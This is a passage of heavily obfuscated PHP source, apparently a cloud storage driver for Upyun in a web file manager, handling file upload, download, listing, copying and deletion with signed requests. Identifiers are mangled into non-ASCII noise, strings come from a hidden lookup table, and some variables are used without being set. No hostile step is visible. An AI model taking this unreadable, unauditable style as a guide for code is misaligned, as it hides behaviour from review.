protected $token = ''; protected $endpoint = "\150\x74\164\160\x3a\57\57\166\60\56\141\x70\151\x2e\x75\x70\x79\165\x6e\56\143\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($ßÛÜŸô) { parent::__construct(); $this->_init($ßÛÜŸô); } public function _init($ÙÀÖû‹ä) { $…Õê³Á =& $_SERVER[ï»»·÷á]; foreach ($ÙÀÖû‹ä as $¼ØóÕÎó => $·µ¼ú•Ó) { if (isset($this->{$¼ØóÕÎó})) { $this->{$¼ØóÕÎó} = $·µ¼ú•Ó; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($…Õê³Á[1475] . LNG($…Õê³Á[1406])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($·“„ÈõÎ, $ó¬ÏíÊ³ = "\x47\x45\124") { $å•ğ¢¢ñ =& $_SERVER[ï»»·÷á]; $½ÙÅ«î = gmdate($å•ğ¢¢ñ[1439]); $µñ«ØÆ = base64_encode(hash_hmac($å•ğ¢¢ñ[1476], "{$ó¬ÏíÊ³}\46{$·“„ÈõÎ}\46{$½ÙÅ«î}", md5("{$this->userpass}"), !0)); $í¡¢´‡­ = array("\x41\x75\x74\x68\157\x72\151\172\141\164\151\x6f\156\x3a\x55\x50\x59\x55\116\x20{$this->username}\x3a{$µñ«ØÆ}", "\104\141\164\145\x3a{$½ÙÅ«î}"); return $í¡¢´‡­; } public function ussRequest($©›İÍ›, $Øì©Æı = "\x47\x45\x54", $–Â§úÕ = false, $¨‡½øÌ¢ = false, $Û§Æ¬£ø = false) { $›³ŞëĞ¸ =& $_SERVER[ï»»·÷á]; $©›İÍ› = trim($©›İÍ›, $›³ŞëĞ¸[8]); $¤­ÀøÒ  = "\x2f{$this->bucket}\x2f{$©›İÍ›}"; $®…ŸóµÊ = $this->ussHeaders($¤­ÀøÒ , $Øì©Æı); if ($¨‡½øÌ¢) { $®…ŸóµÊ = array_merge($®…ŸóµÊ, $¨‡½øÌ¢); } $à«é®¾Ÿ = url_request($this->endpoint . $¤­ÀøÒ , $Øì©Æı, $–Â§úÕ, $®…ŸóµÊ, $Û§Æ¬£ø); if (!$à«é®¾Ÿ) { return array($›³ŞëĞ¸[1222] => !1, $›³ŞëĞ¸[1212] => $›³ŞëĞ¸[1477]); } if (strtolower($Øì©Æı) == $›³ŞëĞ¸[197] || in_array($à«é®¾Ÿ[$›³ŞëĞ¸[1222]], array($›³ŞëĞ¸[1332], $›³ŞëĞ¸[1478]))) { $–Â§úÕ = $à«é®¾Ÿ[$›³ŞëĞ¸[1479]]; } else { $–Â§úÕ = json_decode($à«é®¾Ÿ[$›³ŞëĞ¸[1212]], !0); if (!$–Â§úÕ) { $–Â§úÕ = $à«é®¾Ÿ[$›³ŞëĞ¸[1212]]; } else { if (!$à«é®¾Ÿ[$›³ŞëĞ¸[762]] && isset($–Â§úÕ[$›³ŞëĞ¸[1480]])) { $–Â§úÕ = $–Â§úÕ[$›³ŞëĞ¸[1480]]; } } } return array($›³ŞëĞ¸[1222] => $à«é®¾Ÿ[$›³ŞëĞ¸[762]], $›³ŞëĞ¸[1212] => $–Â§úÕ); } public function mkfile($âÓ©Ÿ¾Û, $±üû‡÷ = '', $¤Î´ù´Ù = REPEAT_RENAME) { if ($this->setContent($âÓ©Ÿ¾Û, $±üû‡÷)) { return $this->getPathOuter($âÓ©Ÿ¾Û); } return !1; } public function mkdir($â¦×ãÍ, $÷ÀŞ±íá = REPEAT_SKIP) { $´ ¤ à£ =& $_SERVER[ï»»·÷á]; $‚ï§Åô = trim($â¦×ãÍ, $´ ¤ à£[8]); if ($this->_isFolder($‚ï§Åô)) { return $this->getPathOuter($‚ï§Åô); } $¦ıØ¹È‰ = array($´ ¤ à£[1481]); $°ÚÈİš = $this->ussRequest($‚ï§Åô, $´ ¤ à£[226], !1, $¦ıØ¹È‰); return $°ÚÈİš[$´ ¤ à£[1222]] ? $this->getPathOuter($‚ï§Åô) : !1; } public function copyFile($ùòµó¹«, $…‡Ùü¾ı) { $àââÁ¥ =& $_SERVER[ï»»·÷á]; $·Ì¯ù®€ = array($àââÁ¥[1482] . "\57{$this->bucket}\57{$ùòµó¹«}", $àââÁ¥[1483]); $ö¹¶±«• = $this->ussRequest($…‡Ùü¾ı, $àââÁ¥[228], !1, $·Ì¯ù®€); return $ö¹¶±«•[$àââÁ¥[1222]] ? !0 : $this->getPathOuter($…‡Ùü¾ı); } public function moveFile($ç—ƒ¾†Ä, $—Õ÷šÒ») { $âµÛ€›Ó =& $_SERVER[ï»»·÷á]; $‡¦ÂÕŒÏ = array($âµÛ€›Ó[1484] . "\57{$this->bucket}\x2f{$ç—ƒ¾†Ä}", $âµÛ€›Ó[1483]); $Ó—™’É€ = $this->ussRequest($—Õ÷šÒ», $âµÛ€›Ó[228], !1, $‡¦ÂÕŒÏ); return $Ó—™’É€[$âµÛ€›Ó[1222]] ? !0 : $this->getPathOuter($—Õ÷šÒ»); } public function delFile($¥ôçŸù½) { $Ÿàµä¯ =& $_SERVER[ï»»·÷á]; $–‡Ë˜Àß = $this->ussRequest($¥ôçŸù½, $Ÿàµä¯[1485]); return $–‡Ë˜Àß[$Ÿàµä¯[1222]] ? !0 : !1; } public function delFolder($˜À…Şš) { $Ì±¸É‚Ş =& $_SERVER[ï»»·÷á]; if (!$this->exist($˜À…Şš)) { return !0; } $this->listItemCache = !1; $ ™¾º« = $£è¬ ŸÙ = array(); $this->fileList($˜À…Şš, $ ™¾º«, $£è¬ ŸÙ, !0); $this->listItemCache = !0; foreach ($£è¬ ŸÙ as $˜¾ç‘ ) { $ó‚Ø’ä¨ = $this->ussRequest($˜¾ç‘ [$Ì±¸É‚Ş[32]], $Ì±¸É‚Ş[1485]); if (!$ó‚Ø’ä¨[$Ì±¸É‚Ş[1222]]) { return !1; } } foreach ($ ™¾º« as $…ÇõĞÚ‡) { $ó‚Ø’ä¨ = $this->ussRequest($…ÇõĞÚ‡, $Ì±¸É‚Ş[1485]); if (!$ó‚Ø’ä¨[$Ì±¸É‚Ş[1222]]) { return !1; } } $ó‚Ø’ä¨ = $this->ussRequest($˜À…Şš, $Ì±¸É‚Ş[1485]); return $ó‚Ø’ä¨[$Ì±¸É‚Ş[1222]]; } public function rename($ìÑØÏÏ¿, $Ë×©ªÔÆ) { if ($this->isFile($ìÑØÏÏ¿)) { $Ë×©ªÔÆ = get_path_father($ìÑØÏÏ¿) . $Ë×©ªÔÆ; return $this->moveFile($ìÑØÏÏ¿, $Ë×©ªÔÆ); } return $this->renameObject($ìÑØÏÏ¿, $Ë×©ªÔÆ); } public function fileInfo($­¶È¥ğ, $şÇĞ…¶Í = false, $„§ê’Ç„ = array()) { $ÙöÑ¿›Ù =& $_SERVER[ï»»·÷á]; $şÉÙÅıÆ = array($ÙöÑ¿›Ù[32] => $this->pathThis($­¶È¥ğ), $ÙöÑ¿›Ù[84] => $this->getPathOuter($ÙöÑ¿›Ù[8] . $­¶È¥ğ), $ÙöÑ¿›Ù[33] => $ÙöÑ¿›Ù[200], $ÙöÑ¿›Ù[76] => isset($„§ê’Ç„[$ÙöÑ¿›Ù[76]]) ? $„§ê’Ç„[$ÙöÑ¿›Ù[76]] : 0, $ÙöÑ¿›Ù[174] => $this->ext($­¶È¥ğ)); if ($şÇĞ…¶Í) { return $şÉÙÅıÆ; } $şÉÙÅıÆ[$ÙöÑ¿›Ù[201]] = $şÉÙÅıÆ[$ÙöÑ¿›Ù[85]] = 0; $şÉÙÅıÆ[$ÙöÑ¿›Ù[202]] = $şÉÙÅıÆ[$ÙöÑ¿›Ù[203]] = !0; if (empty($„§ê’Ç„)) { $„§ê’Ç„ = $this->objectMeta($­¶È¥ğ); if (!$„§ê’Ç„) { return $şÉÙÅıÆ; } } $şÉÙÅıÆ[$ÙöÑ¿›Ù[201]] = intval($„§ê’Ç„[$ÙöÑ¿›Ù[1486]]); $şÉÙÅıÆ[$ÙöÑ¿›Ù[85]] = intval($„§ê’Ç„[$ÙöÑ¿›Ù[1487]]); $şÉÙÅıÆ[$ÙöÑ¿›Ù[76]] = $„§ê’Ç„[$ÙöÑ¿›Ù[76]]; return $şÉÙÅıÆ; } public function folderInfo($ü€ŒœÄ, $ƒÒùä™€ = false) { $óÌòçÔ· =& $_SERVER[ï»»·÷á]; $û€Ú¯®Ç = array($óÌòçÔ·[32] => $this->pathThis($ü€ŒœÄ), $óÌòçÔ·[84] => $this->getPathOuter($óÌòçÔ·[8] . $ü€ŒœÄ), $óÌòçÔ·[33] => $óÌòçÔ·[75]); if ($ƒÒùä™€) { return $û€Ú¯®Ç; } $û€Ú¯®Ç[$óÌòçÔ·[201]] = $û€Ú¯®Ç[$óÌòçÔ·[85]] = 0; $û€Ú¯®Ç[$óÌòçÔ·[202]] = $û€Ú¯®Ç[$óÌòçÔ·[203]] = !0; if (empty($‰¡çÄÊ»)) { $‰¡çÄÊ» = $this->objectMeta($ü€ŒœÄ); if (!$‰¡çÄÊ») { return $û€Ú¯®Ç; } } $û€Ú¯®Ç[$óÌòçÔ·[201]] = intval($‰¡çÄÊ»[$óÌòçÔ·[1486]]); $û€Ú¯®Ç[$óÌòçÔ·[85]] = intval($‰¡çÄÊ»[$óÌòçÔ·[1487]]); return $û€Ú¯®Ç; } private function listObjs($«¯Ö·€ä, $€½ô§Ø = 0, $ùã¾ã¥— = 1000) { $Š†±ÌËò =& $_SERVER[ï»»·÷á]; $Æƒìˆ°È = array($Š†±ÌËò[1488], $Š†±ÌËò[1489] . $ùã¾ã¥—); if ($€½ô§Ø) { $Æƒìˆ°È[] = $Š†±ÌËò[1490] . $€½ô§Ø; } $–ˆ”Ã‡ = $this->ussRequest($«¯Ö·€ä, $Š†±ÌËò[230], !1, $Æƒìˆ°È); return !$–ˆ”Ã‡[$Š†±ÌËò[1222]] ? !1 : $–ˆ”Ã‡[$Š†±ÌËò[1212]]; } private function fileList($ÒŒŞ”íˆ, &$¹ı¿ïş², &$í¼…Ì», $À÷ş‡¿ë = false) { $ïßµµÂØ =& $_SERVER[ï»»·÷á]; $êõàÜå° = $ïßµµÂØ[12]; $Â¡ï¦µ” = 1000; $œÑÓóâö = rtrim($ÒŒŞ”íˆ, $ïßµµÂØ[8]) . $ïßµµÂØ[8]; while (!0) { check_abort(); $øõĞÚ“Œ = $this->listObjs($ÒŒŞ”íˆ, $êõàÜå°, $Â¡ï¦µ”); if (!$øõĞÚ“Œ) { return !1; } $êõàÜå° = isset($øõĞÚ“Œ[$ïßµµÂØ[1491]]) ? $øõĞÚ“Œ[$ïßµµÂØ[1491]] : $ïßµµÂØ[12]; $Çç‚”óŠ = isset($øõĞÚ“Œ[$ïßµµÂØ[1492]]) ? $øõĞÚ“Œ[$ïßµµÂØ[1492]] : array(); foreach ($Çç‚”óŠ as $“‘íáìŠ) { $ç‘•Áß® = $“‘íáìŠ[$ïßµµÂØ[33]] == $ïßµµÂØ[75] ? !0 : !1; $Ë›…ã˜İ = ltrim($œÑÓóâö . $“‘íáìŠ[$ïßµµÂØ[32]], $ïßµµÂØ[8]) . ($ç‘•Áß® ? $ïßµµÂØ[8] : $ïßµµÂØ[12]); $ƒûãä­ = array($ïßµµÂØ[32] => $Ë›…ã˜İ, $ïßµµÂØ[33] => $ç‘•Áß® ? $ïßµµÂØ[75] : $ïßµµÂØ[200], $ïßµµÂØ[76] => $“‘íáìŠ[$ïßµµÂØ[337]], $ïßµµÂØ[1487] => $“‘íáìŠ[$ïßµµÂØ[1493]]); $this->cacheMethodInfoSet($Ë›…ã˜İ, $ç‘•Áß®, $ƒûãä­); if ($ç‘•Áß®) { $¹ı¿ïş²[] = $Ë›…ã˜İ; if ($À÷ş‡¿ë) { $this->fileList($Ë›…ã˜İ, $¹ı¿ïş², $í¼…Ì», $À÷ş‡¿ë); } continue; } $í¼…Ì»[] = $ƒûãä­; } if (count($Çç‚”óŠ) < $Â¡ï¦µ”) { break; } } $this->cacheMethodInfoSet($ÒŒŞ”íˆ, !0); } public function listPath($›±ó°™, $¯Ëªàé¶ = false) { $‡åñšàğ =& $_SERVER[ï»»·÷á]; $¢ôë¼Ñ = $·ıÛÓáß = array(); $this->fileList($›±ó°™, $¢ôë¼Ñ, $·ıÛÓáß); foreach ($¢ôë¼Ñ as $ü¯á¼»í => $úÆŒºåÈ) { $¢ôë¼Ñ[$ü¯á¼»í] = $this->folderInfo($úÆŒºåÈ, $¯Ëªàé¶); } foreach ($·ıÛÓáß as $ü¯á¼»í => $úÆŒºåÈ) { $·ıÛÓáß[$ü¯á¼»í] = $this->fileInfo($úÆŒºåÈ[$‡åñšàğ[32]], $¯Ëªàé¶, $úÆŒºåÈ); } return array($‡åñšàğ[82] => $¢ôë¼Ñ, $‡åñšàğ[83] => $·ıÛÓáß); } public function has($­Ø¡Í·, $Çí¹Ï = false, $ç½í˜´ = true) { $Ê¼ğ =& $_SERVER[ï»»·÷á]; $ĞšşØò™ = $Ê¼ğ[12]; $ßÇˆ­Ä = 500; $’ˆÜÉû = 0; $ˆ‡áö¥ = 0; $â­‹Ñ¹À = rtrim($­Ø¡Í·, $Ê¼ğ[8]) . $Ê¼ğ[8]; while (!0) { check_abort(); $Ÿš—´ı‹ = $this->listObjs($­Ø¡Í·, $ĞšşØò™, $ßÇˆ­Ä); if (!$Ÿš—´ı‹) { return !1; } $ĞšşØò™ = isset($Ÿš—´ı‹[$Ê¼ğ[1491]]) ? $Ÿš—´ı‹[$Ê¼ğ[1491]] : $Ê¼ğ[12]; $®‰íüŒ = isset($Ÿš—´ı‹[$Ê¼ğ[1492]]) ? $Ÿš—´ı‹[$Ê¼ğ[1492]] : array(); if (empty($®‰íüŒ)) { break; } $×Á‚®½¤ = array_filter($®‰íüŒ, function ($´î ·ğ) { $™‡—Ò˜Ë =& $_SERVER[ï»»·÷á]; return $´î ·ğ[$™‡—Ò˜Ë[33]] == $™‡—Ò˜Ë[75]; }); $ı¤‘¦û· = count($®‰íüŒ); $×Á‚®½¤ = count($×Á‚®½¤); $Æºü…› = $ı¤‘¦û· - $×Á‚®½¤; if ($Çí¹Ï) { $ˆ‡áö¥ += $×Á‚®½¤; $’ˆÜÉû += $Æºü…›; if ($ı¤‘¦û· < $ßÇˆ­Ä) { break; } continue; } if ($ç½í˜´) { if ($Æºü…›) { return !0; } } else { if ($×Á‚®½¤) { return !0; } } if ($ı¤‘¦û· < $ßÇˆ­Ä) { break; } } if ($Çí¹Ï) { return array($Ê¼ğ[207] => $’ˆÜÉû, $Ê¼ğ[208] => $ˆ‡áö¥); } return !1; } public function listAll($Ö¦êëÃã) { $”àğÅó =& $_SERVER[ï»»·÷á]; $¯Ø« °” = $‰„•¨¢Û = array(); $this->fileList($Ö¦êëÃã, $¯Ø« °”, $‰„•¨¢Û, !0); $ ßİ ¥¼ = array_to_keyvalue($‰„•¨¢Û, $”àğÅó[32]); foreach ($¯Ø« °” as $î³™ÍÆŒ) { if (is_string($î³™ÍÆŒ)) { $ ßİ ¥¼[$î³™ÍÆŒ] = array($”àğÅó[76] => 0); } } return $this->listAllFiles($Ö¦êëÃã, $ ßİ ¥¼); } public function canRead($ãáş•·Ö) { return $this->exist($ãáş•·Ö) ? !0 : !1; } public function canWrite($æ„õîø¿) { return $this->exist($æ„õîø¿) ? !0 : !1; } public function getContent($ş¤Ÿëğ) { return $this->fileSubstr($ş¤Ÿëğ, 0, -1); } public function setContent($¾¾°˜Ç¯, $±—Ä§©‚ = '') { $ğ›Šğ¼‘ =& $_SERVER[ï»»·÷á]; if (!$±—Ä§©‚) { $Ã…† = $this->ussRequest($¾¾°˜Ç¯, $ğ›Šğ¼‘[226]); return $Ã…†[$ğ›Šğ¼‘[1222]]; } $ïºª×¹Ê = $this->tempFile($this->pathThis($¾¾°˜Ç¯)); file_put_contents($ïºª×¹Ê, $±—Ä§©‚); if ($this->upload($¾¾°˜Ç¯, $ïºª×¹Ê)) { $this->tempFileRemve($ïºª×¹Ê); return !0; } return !1; } public function fileSubstr($ÌŞ°‚êõ, $í¥¿™¬Ê, $¾Œ¸™¥¥) { $×½©ŒÒ =& $_SERVER[ï»»·÷á]; if (!($éˆÄ«º = $this->link($ÌŞ°‚êõ))) { return !1; } $±ç¬œæ„ = !1; if ($¾Œ¸™¥¥ > 0) { $ÄÑêŸ» = $í¥¿™¬Ê + $¾Œ¸™¥¥ - 1; $±ç¬œæ„ = array($×½©ŒÒ[1454] . $í¥¿™¬Ê . $×½©ŒÒ[386] . $ÄÑêŸ»); } $æã˜³Çß = url_request($éˆÄ«º, $×½©ŒÒ[230], !1, $±ç¬œæ„); return $æã˜³Çß[$×½©ŒÒ[762]] ? $æã˜³Çß[$×½©ŒÒ[1212]] : !1; } public function upload($ò›¸ÉÅõ, $Ô°àŸ—Û, $àÏÊœ = false, $¿äŸ›ƒ = REPEAT_REPLACE) { $Íô±²§Ù =& $_SERVER[ï»»·÷á]; $™ÖÓ·‘¼ = IO::size($Ô°àŸ—Û); if ($™ÖÓ·‘¼ <= 1024 * 1024 * 200) { $Ù×í™³Š = array($Íô±²§Ù[1494] . $Ô°àŸ—Û); $˜ö˜¯éı = $this->ussRequest($ò›¸ÉÅõ, $Íô±²§Ù[228], $Ù×í™³Š); return $˜ö˜¯éı[$Íô±²§Ù[1222]] ? $this->getPathOuter($ò›¸ÉÅõ) : !1; } $Òóôƒî = 1024 * 1024 * 10; $‰œ‰ä‚× = array($Íô±²§Ù[1495], $Íô±²§Ù[1496] . $™ÖÓ·‘¼, $Íô±²§Ù[1497], $Íô±²§Ù[1498] . $Òóôƒî); $˜ö˜¯éı = $this->ussRequest($ò›¸ÉÅõ, $Íô±²§Ù[228], !1, $‰œ‰ä‚×); if (!$˜ö˜¯éı[$Íô±²§Ù[1222]]) { return !1; } $ƒšŸˆÎ³ = $˜ö˜¯éı[$Íô±²§Ù[1212]]; $ŸÎº¯Ï = 0; $ôìä·™¹ = $ƒšŸˆÎ³[$Íô±²§Ù[1499]]; $Öœüëö = fopen($Ô°àŸ—Û, $Íô±²§Ù[1403]); if (!$Öœüëö) { return !1; } do { $ôïÆú = $ƒšŸˆÎ³[$Íô±²§Ù[1500]]; fseek_64($Öœüëö, $ŸÎº¯Ï); $Öãµ¿Ã = fread($Öœüëö, $ôïÆú); $óé Œ®¡ = 0; do { $óé Œ®¡++; $ƒšŸˆÎ³ = $this->uploadPart($ò›¸ÉÅõ, $ƒšŸˆÎ³, $Öãµ¿Ã); } while (!$ƒšŸˆÎ³ && $óé Œ®¡ < 3); if (!$ƒšŸˆÎ³) { return !1; } $ôìä·™¹ = $ƒšŸˆÎ³[$Íô±²§Ù[1499]]; $ŸÎº¯Ï += $ôïÆú; } while ($ôìä·™¹ != -1); fclose($Öœüëö); $‰œ‰ä‚× = array($Íô±²§Ù[1501], $Íô±²§Ù[1502] . $ƒšŸˆÎ³[$Íô±²§Ù[1503]], $Íô±²§Ù[1497]); $˜ö˜¯éı = $this->ussRequest($ò›¸ÉÅõ, $Íô±²§Ù[228], !1, $‰œ‰ä‚×); return $˜ö˜¯éı[$Íô±²§Ù[1222]] ? $this->getPathOuter($Ñ™Úß™ ) : !1; } private function uploadPart($Ö…½“ğ, $‰¶Ó£¸½, &$İøì¶¶·) { $ĞÁ»»öÏ =& $_SERVER[ï»»·÷á]; $Šİõ¦ñì = array($ĞÁ»»öÏ[1504], $ĞÁ»»öÏ[1502] . $‰¶Ó£¸½[$ĞÁ»»öÏ[1503]], $ĞÁ»»öÏ[1505] . $‰¶Ó£¸½[$ĞÁ»»öÏ[1499]], $ĞÁ»»öÏ[142] . $‰¶Ó£¸½[$ĞÁ»»öÏ[1500]]); $•ğŠ’ğØ = $this->ussRequest($Ö…½“ğ, $ĞÁ»»öÏ[228], $İøì¶¶·, $Šİõ¦ñì); return !$•ğŠ’ğØ[$ĞÁ»»öÏ[1222]] ? $•ğŠ’ğØ[$ĞÁ»»öÏ[1222]] : $•ğŠ’ğØ[$ĞÁ»»öÏ[1212]]; } public function uploadFormData($É’ÎøÇ, $œä†­º¤ = 3600) { return $this->uploadPolicy($É’ÎøÇ, $œä†­º¤); } public function multiUploadFormData($´›ù¸½—, $àó¡Æ™ = 3600) { $Ãş¥ÑÉ¸ =& $_SERVER[ï»»·÷á]; $ÅÚ¿ª¢ì = (int) $GLOBALS[$Ãş¥ÑÉ¸[7]][$Ãş¥ÑÉ¸[76]]; return $this->uploadPolicy($´›ù¸½—, $àó¡Æ™, $ÅÚ¿ª¢ì); } private function uploadPolicy($äë“œ°Ù, $¤æ–›áÉ = 3600, $ğœÓ• = 0) { $äÚÈ­„¥ =& $_SERVER[ï»»·÷á]; $¬Øˆ¬¯ = $äÚÈ­„¥[8] . $this->bucket; $Üƒ‘’­â = gmdate($äÚÈ­„¥[1439]); $™œ¢ùÉÌ = array($äÚÈ­„¥[1506] => $this->bucket, $äÚÈ­„¥[1507] => $äë“œ°Ù, $äÚÈ­„¥[1508] => time() + $¤æ–›áÉ, $äÚÈ­„¥[1509] => $Üƒ‘’­â); if ($ğœÓ•) { $™œ¢ùÉÌ[$äÚÈ­„¥[1419]] = $ğœÓ•; } $ÃŒÍÀÚ¸ = base64_encode(json_encode($™œ¢ùÉÌ)); $Š½àÑ¢„ = base64_encode(hash_hmac($äÚÈ­„¥[1476], "\x50\117\x53\x54\46{$¬Øˆ¬¯}\x26{$Üƒ‘’­â}\x26{$ÃŒÍÀÚ¸}", md5("{$this->userpass}"), !0)); $¨Éåø… = array($äÚÈ­„¥[1344] => $ÃŒÍÀÚ¸, $äÚÈ­„¥[1510] => "\x55\x50\x59\125\x4e\x20{$this->username}\72{$Š½àÑ¢„}", $äÚÈ­„¥[182] => $this->endpoint . $¬Øˆ¬¯); return $¨Éåø…; } public function download($–…€­ù, $Üı«÷Ğ) { $ïü÷­üÑ = IO::getPathInner(IO::mkfile($Üı«÷Ğ)); if (!($Öàˆ¸¼ = $this->link($–…€­ù))) { return !1; } $á¨Éïª = 0; $Å©›¼ì† = 1024 * 200; $Ğ–îîÂÄ = fopen($ïü÷­üÑ, $_SERVER[ï»»·÷á][1460]); while (!0) { $©£çò¬² = $this->fileSubstr($–…€­ù, $á¨Éïª, $Å©›¼ì†); if ($©£çò¬² === !1) { return !1; } fwrite($Ğ–îîÂÄ, $©£çò¬²); $á¨Éïª += $Å©›¼ì†; if (strlen($©£çò¬²) < $Å©›¼ì†) { break; } } fclose($Ğ–îîÂÄ); return $Üı«÷Ğ; } public function link($¶ĞÕŒ¾Õ, $ö­ˆÔçˆ = array()) { $ŸÏßÛ«ë =& $_SERVER[ï»»·÷á]; $¶ĞÕŒ¾Õ = trim($¶ĞÕŒ¾Õ, $ŸÏßÛ«ë[8]); if (!empty($this->token)) { $ÏÕîò¾ç = strtotime(date($ŸÏßÛ«ë[1511])); $’®ñš• = substr(md5($this->token . $ŸÏßÛ«ë[284] . $ÏÕîò¾ç . $ŸÏßÛ«ë[1512] . $¶ĞÕŒ¾Õ), 12, 8) . $ÏÕîò¾ç; $ö­ˆÔçˆ[] = $ŸÏßÛ«ë[1513] . $’®ñš•; } $­»™¸Ø = !empty($ö­ˆÔçˆ) ? $ŸÏßÛ«ë[73] . implode($ŸÏßÛ«ë[284], $ö­ˆÔçˆ) : $ŸÏßÛ«ë[12]; return $this->getHost() . $ŸÏßÛ«ë[8] . $¶ĞÕŒ¾Õ . $­»™¸Ø; } public function fileOut($ä¬·µ‰, $—óÔÙö = false, $ê‘˜÷Æô = false, $„©™ı°ô = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ä¬·µ‰, $—óÔÙö, $ê‘˜÷Æô, $„©™ı°ô); } if (!$ê‘˜÷Æô) { $ê‘˜÷Æô = $this->pathThis($ä¬·µ‰); } $ä¹éò = $—óÔÙö ? array($_SERVER[ï»»·÷á][1514] . rawurlencode($ê‘˜÷Æô)) : array(); $ĞÓœàòæ = $this->link($ä¬·µ‰, $ä¹éò); $this->fileOutLink($ĞÓœàòæ); } public function fileOutServer($½Èí‰ìù, $£©¥¥ªà = false, $ßŠ‘­‰û = false, $¦êÌ§äË = '') { parent::fileOut($½Èí‰ìù, $£©¥¥ªà, $ßŠ‘­‰û, $¦êÌ§äË); } public function fileOutImage($ÇÁ’‹ŠÅ, $ğ…ßñêÀ = 250) { $í¡­¨à¶ = $this->link($ÇÁ’‹ŠÅ . $_SERVER[ï»»·÷á][1515] . $ğ…ßñêÀ); $this->fileOutLink($í¡­¨à¶); } public function fileOutImageServer($‰ØÙ¯‹», $ßš•¢ùÊ = 250) { parent::fileOutImage($‰ØÙ¯‹», $ßš•¢ùÊ); } public function hashMd5($î‡ÅæÖ) { $˜Ÿœïˆ =& $_SERVER[ï»»·÷á]; $õÊÚªÆ• = $this->_objectMeta($î‡ÅæÖ); return isset($õÊÚªÆ•[$˜Ÿœïˆ[212]]) ? $õÊÚªÆ•[$˜Ÿœïˆ[212]] : !1; } public function size($•õËÚÍ‹) { $ÑŠ¢ÕĞó = $this->objectMeta($•õËÚÍ‹); return $ÑŠ¢ÕĞó ? $ÑŠ¢ÕĞó[$_SERVER[ï»»·÷á][76]] : 0; } public function info($ñŒŸ£µ) { if ($this->isFolder($ñŒŸ£µ)) { return $this->folderInfo($ñŒŸ£µ); } else { if ($this->isFile($ñŒŸ£µ)) { return $this->fileInfo($ñŒŸ£µ); } } return !1; } public function exist($­ì‰¸ñ…) { return $this->isFile($­ì‰¸ñ…) || $this->isFolder($­ì‰¸ñ…); } public function isFile($‹íºÔ´ı) { return !$this->isFolder($‹íºÔ´ı) && $this->objectMeta($‹íºÔ´ı); } public function isFolder($·Ïé) { return $this->cacheMethod($_SERVER[ï»»·÷á][165], $·Ïé); } protected function objectMeta($¿¿ŒÈô¡) { return $this->cacheMethod($_SERVER[ï»»·÷á][167], $¿¿ŒÈô¡); } protected function _objectMeta($ÑÄÌïİ–) { $Æú“ã¸ =& $_SERVER[ï»»·÷á]; if ($ÑÄÌïİ– == $Æú“ã¸[12] || $ÑÄÌïİ– == $Æú“ã¸[8]) { return array(); } $´Âœ¢Ì = $this->ussRequest($ÑÄÌïİ–, $Æú“ã¸[1516]); if (!$´Âœ¢Ì[$Æú“ã¸[1222]]) { return null; } $øÀØÌ¥ = isset($´Âœ¢Ì[$Æú“ã¸[1212]]) ? $´Âœ¢Ì[$Æú“ã¸[1212]] : array(); if (!isset($øÀØÌ¥[$Æú“ã¸[1517]])) { return null; } $ŒÆâò¤Î = array($Æú“ã¸[33] => isset($øÀØÌ¥[$Æú“ã¸[1517]]) ? $øÀØÌ¥[$Æú“ã¸[1517]] : null, $Æú“ã¸[76] => isset($øÀØÌ¥[$Æú“ã¸[1518]]) ? $øÀØÌ¥[$Æú“ã¸[1518]] : null, $Æú“ã¸[212] => isset($øÀØÌ¥[$Æú“ã¸[1519]]) ? $øÀØÌ¥[$Æú“ã¸[1519]] : null, $Æú“ã¸[1486] => isset($øÀØÌ¥[$Æú“ã¸[1520]]) ? $øÀØÌ¥[$Æú“ã¸[1520]] : null); $ŒÆâò¤Î[$Æú“ã¸[1487]] = isset($øÀØÌ¥[$Æú“ã¸[1521]]) ? strtotime($øÀØÌ¥[$Æú“ã¸[1521]]) : $ŒÆâò¤Î[$Æú“ã¸[1486]]; return $ŒÆâò¤Î; } protected function _isFolder($Ö›©ííÀ) { $Û³ï¯ =& $_SERVER[ï»»·÷á]; if ($Ö›©ííÀ == $Û³ï¯[12] || $Ö›©ííÀ == $Û³ï¯[8]) { return !0; } $÷€ù×•ô = $this->_objectMeta($Ö›©ííÀ); return isset($÷€ù×•ô[$Û³ï¯[33]]) && $÷€ù×•ô[$Û³ï¯[33]] == $Û³ï¯[75] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($­ŒÓÀ¶­ = false) { } public function exist($°»·àÍ) { $ìÜ¬•÷® = $this->info($°»·àÍ); return $ìÜ¬•÷®[$_SERVER[ï»»·÷á][202]]; } public function isFile($¨‚ö—ô) { $›óœÎìÌ = $this->info($¨‚ö—ô); return $›óœÎìÌ[$_SERVER[ï»»·÷á][202]]; } public function isFolder($†Ø“Ë¢Æ) { return !1; } public function size($¡ó³õè) { $ùïçˆÓ€ = $this->info($¡ó³õè); return $ùïçˆÓ€[$_SERVER[ï»»·÷á][76]]; } public function info($’ãÓÔçë) { return $this->infoParse($’ãÓÔçë); } public function infoAuth($˜¶¬‚ú¡) { return $this->infoParse($˜¶¬‚ú¡); } public function infoWithChildren($ÀÂÈËßº) { return $this->infoParse($ÀÂÈËßº); } public function infoFull($ö¡ÏØ­´) { return $this->infoParse($ö¡ÏØ­´); } private function infoParse($³‹àÈ¥â) { $úîİ×š¹ =& $_SERVER[ï»»·÷á]; $Šâï’¡¡ = $this->header($³‹àÈ¥â); if (!$Šâï’¡¡ || !$Šâï’¡¡[$úîİ×š¹[762]]) { return !1; } $îùÅÛí  = _get($Šâï’¡¡, $úîİ×š¹[337], 0); $ƒ™õ‚†ı = array($úîİ×š¹[32] => $Šâï’¡¡[$úîİ×š¹[32]], $úîİ×š¹[84] => $³‹àÈ¥â, $úîİ×š¹[33] => $úîİ×š¹[200], $úîİ×š¹[76] => intval($îùÅÛí ), $úîİ×š¹[174] => get_path_ext($Šâï’¡¡[$úîİ×š¹[32]]), $úîİ×š¹[1400] => $îùÅÛí  > 0 && $Šâï’¡¡[$úîİ×š¹[1522]], $úîİ×š¹[1401] => !1); return $ƒ™õ‚†ı; } private function header($íé×—½Ô) { $­Ğïîë… =& $_SERVER[ï»»·÷á]; if (isset(self::$_cacheHeader[$íé×—½Ô])) { return self::$_cacheHeader[$íé×—½Ô]; } $Ë†íá…¦ = 